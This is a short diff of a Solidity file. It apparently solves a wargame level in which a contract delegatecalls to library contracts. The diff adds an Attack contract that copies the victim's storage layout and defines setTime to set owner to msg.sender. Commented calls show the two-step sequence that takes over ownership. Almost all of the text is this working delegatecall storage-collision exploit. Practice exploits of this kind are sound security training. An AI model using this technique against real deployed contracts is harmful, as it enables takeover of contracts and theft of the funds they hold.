@@ -36,5 +36,14 @@ contract LibraryContract {
 contract Attack {
     address public timeZone1Library;
     address public timeZone2Library;
-    address public owner; 
+    address public owner;
+
+    function setTime(uint256) public {
+        owner = msg.sender;
+    }
 }
+
+// await contract.setSecondTime("攻击合约")
+// await contract.setFirstTime("0")
+
+
